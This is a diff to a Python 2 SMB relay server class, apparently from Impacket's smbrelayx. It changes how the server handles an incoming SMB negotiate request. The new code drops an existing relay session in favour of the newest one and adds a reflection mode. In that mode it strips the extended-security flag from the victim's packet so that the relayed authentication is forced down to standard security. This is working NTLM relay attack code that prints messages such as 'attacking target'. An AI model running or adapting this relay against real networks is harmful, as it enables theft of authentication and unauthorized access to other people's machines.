@@ -222,28 +222,35 @@ class SMBRelayServer:
         # SMBRelay
         smbData = smbServer.getConnectionData('SMBRelay', False)
         if smbData.has_key(self.target):
-            # won't work until we have IPC on smbserver (if runs as ForkMixIn)
-            print "[!] %s has already a connection in progress" % self.target
-        else:
-            print "[*] Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target)
-            try: 
-                if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
+            # Remove the previous connection and use the last one
+            smbClient = smbData[self.target]['SMBClient']
+            del(smbClient)
+            del (smbData[self.target])
+        print "[*] Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target)
+        try: 
+            if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
+                extSec = False
+            else:
+                if self.mode.upper() == 'REFLECTION':
+                    # Force standard security when doing reflection
+                    print "[*] Downgrading to standard security"
                     extSec = False
+                    recvPacket['Flags2'] = recvPacket['Flags2'] & ( ~smb.SMB.FLAGS2_EXTENDED_SECURITY )
                 else:
                     extSec = True
-                client = SMBClient(self.target, extended_security = extSec)
-                client.set_timeout(60)
-            except Exception, e:
-                print "[!] Connection against target %s FAILED" % self.target
-                print e
-            else: 
-                encryptionKey = client.get_encryption_key()
-                smbData[self.target] = {} 
-                smbData[self.target]['SMBClient'] = client
-                if encryptionKey is not None:
-                    connData['EncryptionKey'] = encryptionKey
-                smbServer.setConnectionData('SMBRelay', smbData)
-                smbServer.setConnectionData(connId, connData)
+            client = SMBClient(self.target, extended_security = extSec)
+            client.set_timeout(60)
+        except Exception, e:
+            print "[!] Connection against target %s FAILED" % self.target
+            print e
+        else: 
+            encryptionKey = client.get_encryption_key()
+            smbData[self.target] = {} 
+            smbData[self.target]['SMBClient'] = client
+            if encryptionKey is not None:
+                connData['EncryptionKey'] = encryptionKey
+            smbServer.setConnectionData('SMBRelay', smbData)
+            smbServer.setConnectionData(connId, connData)
         return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
         #############################################################
 
